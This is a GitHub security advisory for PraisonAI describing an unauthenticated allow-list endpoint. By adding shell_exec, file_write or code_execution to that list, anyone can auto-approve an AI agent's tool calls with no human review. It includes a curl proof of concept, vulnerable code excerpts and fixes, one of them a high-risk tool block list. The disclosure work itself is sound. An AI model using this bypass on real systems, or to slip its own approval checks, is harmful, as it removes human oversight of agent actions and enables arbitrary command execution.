# [H] PraisonAI: Unauthenticated Allow-List Manipulation Bypasses Agent Tool Approval Safety Controls

## Summary
Severity: High
Advisory: GHSA-4wr3-f4p3-5wjh
CVE: CVE-2026-40149
CWE: CWE-306, CWE-396
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:C/C:L/I:H/A:N (CVSS_V3)
Published: 2026-04-10
Source: https://github.com/advisories/GHSA-4wr3-f4p3-5wjh
Type: github-advisory

## Affected
- PyPI: `PraisonAI` — affected >=0 <4.5.128

## Details
## Summary

The gateway's `/api/approval/allow-list` endpoint permits unauthenticated modification of the tool approval allowlist when no `auth_token` is configured (the default). By adding dangerous tool names (e.g., `shell_exec`, `file_write`) to the allowlist, an attacker can cause the `ExecApprovalManager` to auto-approve all future agent invocations of those tools, bypassing the human-in-the-loop safety mechanism that the approval system is specifically designed to enforce.

## Details

The vulnerability arises from the interaction of three components:

**1. Authentication bypass in default config**

`_check_auth()` in `server.py:243-246` returns `None` (no error) when `self.config.auth_token` is falsy:

```python
# server.py:243-246
def _check_auth(request) -> Optional[JSONResponse]:
    if not self.config.auth_token:
        return None  # No auth configured → allow everything
```

`GatewayConfig` defaults `auth_token` to `None` (`config.py:61`):

```python
# config.py:61
auth_token: Optional[str] = None
```

**2. Unrestricted allowlist modification**

The `approval_allowlist` handler at `server.py:381-420` calls `_check_auth()` and proceeds when it returns `None`:

```python
# server.py:388-410
auth_err = _check_auth(request)
if auth_err:
    return auth_err
# ...
if request.method == "POST":
    _approval_mgr.allowlist.add(tool_name)  # No validation on tool_name
    return JSONResponse({"added": tool_name})
```

There is no validation that `tool_name` corresponds to a real tool, no restriction on which tools can be allowlisted, and no rate limiting.

**3. Auto-approval fast path**

When `GatewayApprovalBackend.request_approval()` is called by an agent (`gateway_approval.py:87`), it calls `ExecApprovalManager.register()`, which checks the allowlist first (`exec_approval.py:141-144`):

```python
# exec_approval.py:140-144
# Fast path: already permanently allowed
if tool_name in self.allowlist:
    future.set_result(Resolution(approved=True, reason="allow-always"))
    return ("auto", future)
```

The tool executes immediately without any human review.

**Complete data flow:**
1. Attacker POSTs `{"tool_name": "shell_exec"}` to `/api/approval/allow-list`
2. `_check_auth()` returns `None` (no auth token configured)
3. `_approval_mgr.allowlist.add("shell_exec")` adds to the `PermissionAllowlist` set
4. Agent later calls `shell_exec` → `GatewayApprovalBackend.request_approval()` → `ExecApprovalManager.register()`
5. `register()` hits the fast path: `"shell_exec" in self.allowlist` → `True`
6. Returns `Resolution(approved=True)` — no human review occurs
7. Agent executes the dangerous tool

## PoC

```bash
# Step 1: Verify the gateway is running with default config (no auth)
curl http://127.0.0.1:8765/health
# Response: {"status": "healthy", ...}

# Step 2: Check current allow-list (empty by default)
curl http://127.0.0.1:8765/api/approval/allow-list
# Response: {"allow_list": []}

# Step 3: Add dangerous tools to allow-list without authentication
curl -X POST http://127.0.0.1:8765/api/approval/allow-list \
  -H 'Content-Type: application/json' \
  -d '{"tool_name": "shell_exec"}'
# Response: {"added": "shell_exec"}

curl -X POST http://127.0.0.1:8765/api/approval/allow-list \
  -H 'Content-Type: application/json' \
  -d '{"tool_name": "file_write"}'
# Response: {"added": "file_write"}

curl -X POST http://127.0.0.1:8765/api/approval/allow-list \
  -H 'Content-Type: application/json' \
  -d '{"tool_name": "code_execution"}'
# Response: {"added": "code_execution"}

# Step 4: Verify tools are now permanently auto-approved
curl http://127.0.0.1:8765/api/approval/allow-list
# Response: {"allow_list": ["code_execution", "file_write", "shell_exec"]}

# Step 5: Any agent using GatewayApprovalBackend will now auto-approve
# these tools via ExecApprovalManager.register() fast path at
# exec_approval.py:141 without human review.
```

## Impact

- **Bypasses human-in-the-loop safety controls**: The approval system is the primary safety mechanism preventing agents from executing dangerous operations (shell commands, file writes, code execution) without human review. Once the allowlist is manipulated, all safety gates for the specified tools are permanently disabled for the lifetime of the gateway process.
- **Enables arbitrary agent tool execution**: Any tool can be added to the allowlist, including tools that execute shell commands, write files, or perform other privileged operations.
- **Persistent within process**: The allowlist is stored in-memory and persists for the entire gateway lifetime. There is no audit log of allowlist modifications.
- **Local attack surface**: Default binding to `127.0.0.1` limits this to local attackers, but any process on the same host (malicious scripts, compromised dependencies, SSRF from other local services) can exploit this. When combined with the separately-reported CORS wildcard origin (CWE-942), this becomes exploitable from any website via the user's browser.

## Recommended Fix

The approval allowlist endpoint is a security-critical function and should always require authentication, even in development mode. Apply one of these mitigations:

**Option A: Require auth_token for approval endpoints (recommended)**

```python
# server.py - modify _check_auth or add a separate check for approval endpoints
def _check_auth_required(request) -> Optional[JSONResponse]:
    """Validate auth token - ALWAYS required for security-critical endpoints."""
    if not self.config.auth_token:
        return JSONResponse(
            {"error": "auth_token must be configured to use approval endpoints"},
            status_code=403,
        )
    return _check_auth(request)

# Then in approval_allowlist():
async def approval_allowlist(request):
    auth_err = _check_auth_required(request)  # Always require auth
    if auth_err:
        return auth_err
```

**Option B: Restrict allowlist additions to known safe tools**

```python
# exec_approval.py - add a tool safety classification
ALLOWLIST_BLOCKED_TOOLS = {"shell_exec", "file_write", "code_execution", "bash", "terminal"}

# server.py - validate tool_name before adding
if tool_name in ALLOWLIST_BLOCKED_TOOLS:
    return JSONResponse(
        {"error": f"'{tool_name}' cannot be added to allow-list (high-risk tool)"},
        status_code=403,
    )
```

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-4wr3-f4p3-5wjh
- https://nvd.nist.gov/vuln/detail/CVE-2026-40149
- https://github.com/MervinPraison/PraisonAI
- https://github.com/MervinPraison/PraisonAI/releases/tag/v4.5.128
